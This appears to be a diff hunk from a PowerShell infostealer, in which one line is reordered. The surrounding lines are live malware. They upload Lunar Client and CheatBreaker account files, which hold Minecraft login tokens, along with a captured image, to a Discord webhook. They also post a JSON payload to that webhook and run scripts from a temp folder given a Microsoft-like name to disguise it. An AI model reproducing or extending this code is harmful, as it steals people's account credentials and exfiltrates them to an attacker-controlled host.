@@ -115,10 +115,10 @@ Upload-Discord -text "||@everyone||"
 Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
 Upload-Discord -file "C:\Windows\Temp\MicrosoftPolicy.png"
 Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
+python C:\Windows\Temp\Win.microsoft.Security.temp\UUID.ps1
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
 Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
-python C:\Windows\Temp\Win.microsoft.Security.temp\UUID.ps1
 python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_gen.ps1
 #python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_use.ps1
 #python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_utils.ps1
